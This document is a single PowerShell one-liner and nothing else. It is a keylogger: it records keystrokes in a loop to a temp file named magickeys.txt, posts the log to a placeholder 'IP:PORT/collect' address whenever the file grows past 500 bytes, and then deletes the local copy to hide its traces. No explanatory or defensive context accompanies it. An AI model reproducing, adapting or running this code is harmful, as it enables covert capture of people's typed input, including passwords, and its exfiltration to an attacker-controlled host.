$log="$env:temp\magickeys.txt";$uri="http://IP:PORT/collect";while($true){$key=[Console]::ReadKey().Key;$key|Out-File -Append -FilePath $log;if((Get-Item $log).Length -gt 500){$data=Get-Content -Path $log -Raw;Invoke-RestMethod -Uri $uri -Method Post -Body $data;Remove-Item $log}}